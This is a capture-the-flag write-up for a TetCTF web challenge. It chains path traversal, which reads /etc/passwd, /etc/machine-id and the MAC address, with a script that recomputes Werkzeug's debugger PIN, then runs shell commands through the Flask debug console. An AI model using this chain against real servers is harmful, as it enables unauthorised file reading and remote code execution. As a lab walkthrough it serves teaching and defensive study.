# The Prophet Writeup

Wohoo, wanna hear some oracle?
http://45.77.245.232:7004/ 
Important note: 

- Brute-force won't help you solve this, you may be banned from the challenge if you do.
- Service will auto restart per 2 mins
___

You were given an [url](http://45.77.245.232:7004/) were you could get some "oracle".!["Oracle"](https://github.com/h4ckua11/Writeups/blob/master/TetCTF/Web/Picture1.png) You could browse through a few files 1.txt-5.txt which were under the http://45.77.245.232:7004/read/oracle/. So the website just reads files.

Now if you try to read a file that doesn't exist you get an error.!["Error"](https://github.com/h4ckua11/Writeups/blob/master/TetCTF/Web/Picture2.png)

As you can see this website runs on flask and you could extract the location of the python file that flask is runnning on from the error log.
```
File "/home/web_3/app.py", line 15, in read
```
So I tried to access the file with http://45.77.245.232:7004/read/app.py and it showed me the source code.
```python
from flask import Flask 
from flask import render_template 
import random 

app = Flask(__name__) 

@app.route('/') 
def index(): 
	rand = str(random.randint(1,5))
	return render_template('index.html', random=rand) 

@app.route('/read/<path:filename>') 
def read(filename=None): 
	rand = str(random.randint(1,5)) 
	try: 
		content = open(filename,'r').read()
	except: 
		raise 
	return render_template('file.html', filename=content, random=rand) 

if __name__ == '__main__': 
	app.run(host='0.0.0.0', port='7004', debug=True)

```
From there I was stuck for a while but I noticed after a bit of researching that there was a console under http://45.77.245.232:7004/console. The problem was that it was secured with a pin.
So I ran the sourcecode on my local machine and tried it there. I got a pin
```
 * Serving Flask app "app" (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: on
 * Running on http://0.0.0.0:7004/ (Press CTRL+C to quit)
 * Restarting with stat
 * Debugger is active!
 * Debugger PIN: 234-662-675
 ```
 I wanted to know how the pin was calculated so I looked in the python directory of werkzeug for a generate pin function and I found this file ```/usr/local/lib/python2.7/site-packages/werkzeug/debug/__init__.py```
and there was this function
```python
def get_pin_and_cookie_name(app):
    """Given an application object this returns a semi-stable 9 digit pin
    code and a random key.  The hope is that this is stable between
    restarts to not make debugging particularly frustrating.  If the pin
    was forcefully disabled this returns `None`.

    Second item in the resulting tuple is the cookie name for remembering.
    """
    pin = os.environ.get("WERKZEUG_DEBUG_PIN")
    rv = None
    num = None

    # Pin was explicitly disabled
    if pin == "off":
        return None, None

    # Pin was provided explicitly
    if pin is not None and pin.replace("-", "").isdigit():
        # If there are separators in the pin, return it directly
        if "-" in pin:
            rv = pin
        else:
            num = pin

    modname = getattr(app, "__module__", app.__class__.__module__)

    try:
        # getuser imports the pwd module, which does not exist in Google
        # App Engine. It may also raise a KeyError if the UID does not
        # have a username, such as in Docker.
        username = getpass.getuser()
    except (ImportError, KeyError):
        username = None

    mod = sys.modules.get(modname)

    # This information only exists to make the cookie unique on the
    # computer, not as a security feature.
    probably_public_bits = [
        username,
        modname,
        getattr(app, "__name__", app.__class__.__name__),
        getattr(mod, "__file__", None),
    ]

    # This information is here to make it harder for an attacker to
    # guess the cookie name.  They are unlikely to be contained anywhere
    # within the unauthenticated debug page.
    private_bits = [str(uuid.getnode()), get_machine_id()]

    h = hashlib.md5()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, text_type):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")

    cookie_name = "__wzd" + h.hexdigest()[:20]

    # If we need to generate a pin we salt it a bit more so that we don't
    # end up with the same value and generate out 9 digits
    if num is None:
        h.update(b"pinsalt")
        num = ("%09d" % int(h.hexdigest(), 16))[:9]

    # Format the pincode in groups of digits for easier remembering if
    # we don't have a result yet.
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x : x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num

    filename = "output.txt"
    file = open("output.txt", "w")
    file.write(rv)
    file.close()
    return rv, cookie_name
```
I looked at this function for a while and tried to generate the pin for my local machine first. I deleted everything useless such as the cookie_name because I didn't need it.
Here is the cleaned up code
```python
import hashlib 
from itertools import chain
import os
import getpass

pin = None
rv = None
num = None

probably_public_bits = [ 
  username , # username 
  modname , # modname
  getattr (app, '__name__', getattr (app .__ class__, '__name__')),
  getattr (mod, '__file__', None) 
  ] 

private_bits = [ 
  str (uuid.getnode ()) ,
  get_machine_id ()
  ] 

h = hashlib.md5() 

# Bit is going through every thing in probably_public_bits and private_bits

for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, unicode):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt") 

if num is None : 
    h.update(b"pinsalt")
    num = ("%09d" % int(h.hexdigest(), 16))[:9] 

if rv is None : 
    for group_size in 5 , 4 , 3 : 
        if len (num)% group_size == 0 : 
            rv = '-' .join (num [x: x + group_size] .rjust (group_size, '0' ) 
            for x in range ( 0 , len (num), group_size)) 
            break 
        else : 
            rv = num

print (rv)
```
The rv will be our generated pin. I looked tried to find all the values that were required to generate a valid pin.
Those were the things I needed.
```python
probably_public_bits = [ 
  username , # username 
  modname , # modname
  getattr (app, '__name__', getattr (app .__ class__, '__name__')),
  getattr (mod, '__file__', None) 
  ] 

private_bits = [ 
  str (uuid.getnode ()) ,
  get_machine_id ()
  ] 
 ```
I debugged the function and stepped through every step to get to know what the different strings are.
The username was just the plain username. In my case _h4ckua11_. The modname was just _flask.app_ and the thing after that was _Flask_. The last bit of the public_bits was the location of the location of the main flask directory _/usr/local/lib/python2.7/dist-packages/flask/app.py_.
Now to the private bits.
The _str (uuid.getnode ())_ was the MAC-Address in decimal ad:ce:48:11:22:33->191101483950643.
Then it called the the _get_machine_id()_ function so I searched for it.
```python
def get_machine_id():
    
    global _machine_id
    rv = _machine_id
    if rv is not None:
        return rv

    def _generate():
        # docker containers share the same machine id, get the
        # container id instead
        try:
            with open("/proc/self/cgroup") as f:
                value = f.readline()
        except IOError:
            pass
        else:
            value = value.strip().partition("/docker/")[2]

            if value:
                return value

        # Potential sources of secret information on linux.  The machine-id
        # is stable across boots, the boot id is not
        for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
            try:
                with open(filename, "rb") as f:
                    return f.readline().strip()
            except IOError:
                continue

        # On OS X we can use the computer's serial number assuming that
        # ioreg exists and can spit out that information.
        try:
            # Also catch import errors: subprocess may not be available, e.g.
            # Google App Engine
            # See https://github.com/pallets/werkzeug/issues/925
            from subprocess import Popen, PIPE

            dump = Popen(
                ["ioreg", "-c", "IOPlatformExpertDevice", "-d", "2"], stdout=PIPE
            ).communicate()[0]
            match = re.search(b'"serial-number" = <([^>]+)', dump)
            if match is not None:
                return match.group(1)
        except (OSError, ImportError):
            pass

        # On Windows we can use winreg to get the machine guid
        wr = None
        try:
            import winreg as wr
        except ImportError:
            try:
                import _winreg as wr
            except ImportError:
                pass
        if wr is not None:
            try:
                with wr.OpenKey(
                    wr.HKEY_LOCAL_MACHINE,
                    "SOFTWARE\\Microsoft\\Cryptography",
                    0,
                    wr.KEY_READ | wr.KEY_WOW64_64KEY,
                ) as rk:
                    machineGuid, wrType = wr.QueryValueEx(rk, "MachineGuid")
                    if wrType == wr.REG_SZ:
                        return machineGuid.encode("utf-8")
                    else:
                        return machineGuid
            except WindowsError:
                pass

    _machine_id = rv = _generate()
    return rv
```
It searched different files on different operating systems. On Mac in my case it looked up the Serial Number. On linux it just read _/etc/machine-id_.
Now I had everything to run the code. I ran it and I got the same pin number as the I had earlier.
```python
import hashlib 
from itertools import chain
import os
import getpass

pin = None
rv = None
num = None

probably_public_bits = [ 
  'h4ckua11' , # username 
  'flask.app' , # modname
  'Flask',
  '/usr/local/lib/python2.7/dist-packages/flask/app.py' 
  ] 

private_bits = [ 
  '191101483950643' ,
  'my serial number'
  ] 

h = hashlib.md5() 

# Bit is going through every thing in probably_public_bits and private_bits

for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, unicode):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt") 

if num is None : 
    h.update(b"pinsalt")
    num = ("%09d" % int(h.hexdigest(), 16))[:9] 

if rv is None : 
    for group_size in 5 , 4 , 3 : 
        if len (num)% group_size == 0 : 
            rv = '-' .join (num [x: x + group_size] .rjust (group_size, '0' ) 
            for x in range ( 0 , len (num), group_size)) 
            break 
        else : 
            rv = num

print (rv)
```
```
234-662-675
```
So I tried it on the server.
Since I knew that the _app.py_ was in _/home/web_3/_ I had to get two directories back. With simple url encoding I got to the _/_ directory (http://45.77.245.232:7004/read%2F..%2F../).
I read all the files that I needed for this:
```
probably_public_bits = [ 
  'web3_user' , # username http://45.77.245.232:7004/read%2F..%2F../etc/passwd
  'flask.app' , # modname Always the same 
  'Flask' , # Always the same
  '/usr/local/lib/python3.5/dist-packages/flask/app.py' # getattr (mod, '__file__', None) Error Message: http://45.77.245.232:7004/read%2F..%2F../wrong/file
  ] 

private_bits = [ 
  '94558041547692' , # http://45.77.245.232:7004/read%2F..%2F..%2Fetc/network/interfaces | http://45.77.245.232:7004/read%2F..%2F..%2Fsys/class/net/ens3/address
  'd4e6cb65d59544f3331ea0425dc555a1' # http://45.77.245.232:7004/read%2F..%2F..%2Fetc/machine-id
  ] 
```
I ran it and it gave me this pin
```
157-229-274
```
So I tried to login and it worked.
I now could run python code on the server.
I located the flag file and printed it's contents.
```
[console ready]
>>> import os
>>> print(os.popen("locate flag").read())
/phao_san_pa_lay___1337/flagggg.txt
/usr/lib/x86_64-linux-gnu/perl/5.22.1/bits/waitflags.ph
/usr/src/linux-headers-4.4.0-142/arch/alpha/include/asm/irqflags.h
/usr/src/linux-headers-4.4.0-142/arch/arc/include/asm/irqflags-arcv2.h
...
>>> print(os.popen("cat /phao_san_pa_lay___1337/flagggg.txt").read())
TetCTF{Flask_Debug_LFI___Wuttt__RCE}

Please don't do any further action on the server, we knew the setup suck, but it's needed for the vulnerability

```
And there was the Flag
**TetCTF{Flask_Debug_LFI___Wuttt__RCE}**



